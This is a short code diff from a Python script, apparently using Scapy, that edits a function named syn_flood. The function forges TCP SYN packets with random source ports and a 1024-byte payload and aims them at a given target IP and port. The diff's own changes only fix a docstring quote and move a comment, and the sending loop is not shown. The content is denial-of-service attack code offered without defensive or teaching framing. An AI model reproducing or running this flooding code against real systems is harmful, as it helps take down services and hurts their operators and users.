@@ -15,12 +15,11 @@ import time
 
 
 def syn_flood(target_ip, target_port):
-    """"
+    """
     Forge IP packet with target ip as the destination IP address
     """
     ip = IP(dst=target_ip)
-    # the flag "S" indicates the type SYN
-    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+    tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # the flag "S" indicates the type SYN
     raw = Raw(b"A"*1024)
     packet = ip / tcp / raw
 
